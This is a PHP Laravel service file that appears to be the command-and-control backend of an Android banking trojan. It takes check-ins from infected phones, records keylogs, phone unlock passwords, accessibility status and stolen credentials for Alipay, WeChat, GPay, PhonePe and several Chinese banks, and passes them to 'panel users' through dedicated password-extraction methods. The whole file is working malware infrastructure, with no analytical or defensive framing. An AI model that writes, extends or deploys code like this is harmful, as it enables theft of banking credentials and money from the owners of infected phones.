<?php

declare(strict_types=1);

namespace App\WebSocket\Services;

use App\Models\Device;
use App\Services\GeoIpService;
use App\WebSocket\ConnectionManager;
use App\WebSocket\WebSocketLog;
use Illuminate\Support\Facades\Redis;

final class DeviceStatusService
{
    private ConnectionManager $connectionManager;

    public function __construct(ConnectionManager $connectionManager)
    {
        $this->connectionManager = $connectionManager;
    }

    public function updateFromPing(string $phoneId, string $encodedData): array
    {
        parse_str($encodedData, $params);

        $status = [
            'phone_id' => $phoneId,
            'last_ping' => time(),
            'is_online' => true,
        ];

        $fieldMap = [
            'phone_name' => 'name',
            'model' => 'model',
            'android_version' => 'android_version',
            'battery_charge' => 'battery_level',
            'accessibility' => 'has_accessibility',
            'country' => 'country',
            'user_email' => 'user_email',
            'install_date' => 'installed_at',
            'keylogs' => 'keylogs',
            'phone_password' => 'phone_password',
            'display' => 'display',
            'activz' => 'activz',
            // 新增: 设备信息字段
            'phone' => 'phone_number',
            'ip' => 'ip_address',
            'has_password' => 'has_password',
            // 密码字段
            'pass_phone' => 'pass_phone',
            'pass_phish' => 'pass_phish',
            'pass_alipay' => 'pass_alipay',
            'pass_wechat' => 'pass_wechat',
            'pass_yun' => 'pass_yun',
            'pass_jian' => 'pass_jian',
            'pass_you' => 'pass_you',
            'pass_nong' => 'pass_nong',
            'pass_zhong' => 'pass_zhong',
            'pass_gong' => 'pass_gong',
            'pass_zhao' => 'pass_zhao',
            'pass_gpay' => 'pass_gpay',
            'pass_phonepe' => 'pass_phonepe',
            'pass_bc' => 'pass_bc',
            'pass_mb' => 'pass_mb',
        ];

        foreach ($fieldMap as $paramKey => $statusKey) {
            if (isset($params[$paramKey])) {
                $status[$statusKey] = $this->normalizeValue($params[$paramKey]);
            }
        }

        // IP 与归属地（兼容：异常不影响 WebSocket 正常连接）
        try {
            if (empty($status['ip_address'])) {
                $clientIp = $this->connectionManager->getClientIp($phoneId);
                if ($clientIp !== null) {
                    $status['ip_address'] = $clientIp;
                }
            }

            if (!empty($status['ip_address'])) {
                $existing = $this->connectionManager->getDeviceStatus($phoneId);
                $existingIp = $existing['ip_address'] ?? null;
                $existingLocation = $existing['ip_location'] ?? null;

                if ($status['ip_address'] === $existingIp && !empty($existingLocation)) {
                    $status['ip_location'] = $existingLocation;
                } else {
                    $device = Device::where('uuid', $phoneId)->first();
                    if ($device && $status['ip_address'] === $device->ip_address && !empty($device->ip_location)) {
                        $status['ip_location'] = $device->ip_location;
                    } else {
                        $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip_address']);
                    }
                }
            }
        } catch (\Throwable $e) {
            WebSocketLog::getLogger()->warning('IP/GeoIP handling failed, skipping', [
                'phone_id' => $phoneId,
                'error' => $e->getMessage(),
            ]);
        }

        $this->connectionManager->updateDeviceStatus($phoneId, $status);

        $this->syncToDatabase($phoneId, $status);

        return $status;
    }

    private function normalizeValue(string $value): string
    {
        $arabicIndic = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩'];
        $western = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];

        return str_replace($arabicIndic, $western, trim($value));
    }

    private function syncToDatabase(string $phoneId, array $status): void
    {
        $device = Device::where('uuid', $phoneId)->first();
        $isNewDevice = $device === null;

        if ($isNewDevice) {
            $device = $this->createDevice($phoneId, $status);
            if ($device === null) {
                return;
            }
        }

        $updates = [
            'is_online' => true,
            'last_seen_at' => now(),
        ];

        if (isset($status['name'])) {
            $updates['name'] = $status['name'];
        }
        if (isset($status['model'])) {
            $updates['model'] = $status['model'];
        }
        if (isset($status['android_version'])) {
            $updates['android_version'] = $status['android_version'];
        }
        if (isset($status['battery_level'])) {
            $updates['battery_level'] = (int) $status['battery_level'];
        }
        if (isset($status['has_accessibility'])) {
            $updates['has_accessibility'] = $status['has_accessibility'] === '1';
        }
        if (isset($status['country'])) {
            $updates['country'] = $status['country'];
        }
        if (isset($status['ip_address'])) {
            $updates['ip_address'] = $status['ip_address'];
        }
        if (isset($status['ip_location'])) {
            $updates['ip_location'] = $status['ip_location'];
        }

        $device->update($updates);

        if ($isNewDevice || !$device->getOriginal('is_online')) {
            $this->connectionManager->notifyPanelUsersDeviceOnline($phoneId, $device->user_id, [
                'phone_id' => $phoneId,
                'phone_name' => $device->name ?? '',
                'model' => $device->model ?? '',
                'battery_charge' => $device->battery_level ?? '',
                'is_online' => true,
            ]);
        }
    }

    private function createDevice(string $phoneId, array $status): ?Device
    {
        $userEmail = $status['user_email'] ?? null;
        $user = $this->findUserByEmail($userEmail);

        if ($user === null) {
            $user = \App\Models\User::first();
        }

        if ($user === null) {
            WebSocketLog::getLogger()->warning("Cannot create device {$phoneId}: no user found");
            return null;
        }

        return Device::create([
            'uuid' => $phoneId,
            'user_id' => $user->id,
            'name' => $status['name'] ?? 'Unknown Device',
            'model' => $status['model'] ?? null,
            'android_version' => $status['android_version'] ?? null,
            'battery_level' => isset($status['battery_level']) ? (int) $status['battery_level'] : null,
            'has_accessibility' => ($status['has_accessibility'] ?? '0') === '1',
            'country' => $status['country'] ?? null,
            'ip_address' => $status['ip_address'] ?? null,
            'ip_location' => $status['ip_location'] ?? null,
            'installed_at' => isset($status['installed_at']) ? \Carbon\Carbon::parse($status['installed_at']) : now(),
            'is_online' => true,
            'last_seen_at' => now(),
        ]);
    }

    private function findUserByEmail(?string $email): ?\App\Models\User
    {
        if (empty($email)) {
            return null;
        }

        \Illuminate\Support\Facades\DB::reconnect();

        $user = \App\Models\User::where('email', $email)->first();
        if ($user !== null) {
            return $user;
        }

        $encryptionService = new EncryptionService();
        $encryptedEmail = $encryptionService->encryptEmail($email);

        return \App\Models\User::where('email_encrypted', $encryptedEmail)->first();
    }

    public function getStatus(string $phoneId): array
    {
        return $this->connectionManager->getDeviceStatus($phoneId);
    }

    public function isOnline(string $phoneId): bool
    {
        return $this->connectionManager->isDeviceOnline($phoneId);
    }

    public function markOffline(string $phoneId): void
    {
        Device::where('uuid', $phoneId)->update([
            'is_online' => false,
            'last_seen_at' => now(),
        ]);
    }

    public function formatForPanel(string $phoneId): array
    {
        $status = $this->getStatus($phoneId);
        $isOnline = $this->isOnline($phoneId);

        return [
            'pid' => $phoneId,
            'is_online' => $isOnline,
            'lastPing' => ($status['last_ping'] ?? 0) * 1000,
            'phone_name' => $status['name'] ?? '',
            'model' => $status['model'] ?? '',
            'android_version' => $status['android_version'] ?? '',
            'battery_charge' => $status['battery_level'] ?? '',
            'accessibility' => $status['has_accessibility'] ?? '0',
            'country' => $status['country'] ?? '',
            'user_email' => $status['user_email'] ?? '',
            'install_date' => $status['installed_at'] ?? '',
            'keylogs' => $status['keylogs'] ?? '',
            'phone_password' => $status['phone_password'] ?? '',
            'display' => $status['display'] ?? '',
            'activz' => $status['activz'] ?? '',
            // 新增字段
            'phone' => $status['phone_number'] ?? '',
            'ip' => $status['ip_address'] ?? '',
            'ip_location' => $status['ip_location'] ?? '',
            'has_password' => $status['has_password'] ?? '0',
        ];
    }

    /**
     * 提取密码数据
     */
    public function extractPasswords(string $phoneId): array
    {
        $status = $this->getStatus($phoneId);

        return [
            'phone' => $status['pass_phone'] ?? '',
            'phish' => $status['pass_phish'] ?? '',
            'alipay' => $status['pass_alipay'] ?? '',
            'wechat' => $status['pass_wechat'] ?? '',
            'yun' => $status['pass_yun'] ?? '',
            'jian' => $status['pass_jian'] ?? '',
            'you' => $status['pass_you'] ?? '',
            'nong' => $status['pass_nong'] ?? '',
            'zhong' => $status['pass_zhong'] ?? '',
            'gong' => $status['pass_gong'] ?? '',
            'zhao' => $status['pass_zhao'] ?? '',
            'gpay' => $status['pass_gpay'] ?? '',
            'phonepe' => $status['pass_phonepe'] ?? '',
            'bc' => $status['pass_bc'] ?? '',
            'mb' => $status['pass_mb'] ?? '',
        ];
    }

    /**
     * 格式化完整的设备状态（包含密码）供 Panel 使用
     */
    public function formatFullStatusForPanel(string $phoneId): array
    {
        $phoneInfo = $this->formatForPanel($phoneId);
        $passwords = $this->extractPasswords($phoneId);
        $isOnline = $this->isOnline($phoneId);

        return [
            'phoneInfo' => $phoneInfo,
            'passwords' => $passwords,
            'is_online' => $isOnline,
            'lastPing' => $phoneInfo['lastPing'] ?? null,
        ];
    }
}
